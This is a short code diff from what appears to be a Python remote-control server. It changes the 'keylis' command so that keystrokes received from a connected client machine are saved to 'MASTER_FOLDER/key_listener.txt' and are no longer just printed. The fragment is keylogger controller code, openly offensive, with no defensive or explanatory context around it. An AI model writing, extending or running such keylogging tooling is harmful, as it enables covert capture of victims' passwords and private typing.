@@ -58,8 +58,10 @@ def main():
                 elif command == "keylis":
                     connection.send(command.encode(HASH))
                     print("command sent!")
+                    #save the key presses in a .txt file
                     def listen_for_keys(event):
-                        print(connection.recv(BUFFER_SIZE).decode(HASH))
+                        with open("MASTER_FOLDER/key_listener.txt","a") as file:
+                            file.write(connection.recv(BUFFER_SIZE).decode(HASH))
                     keyboard.hook(listen_for_keys)
                     keyboard.wait('esc')
                 #stop the server after a non-command input
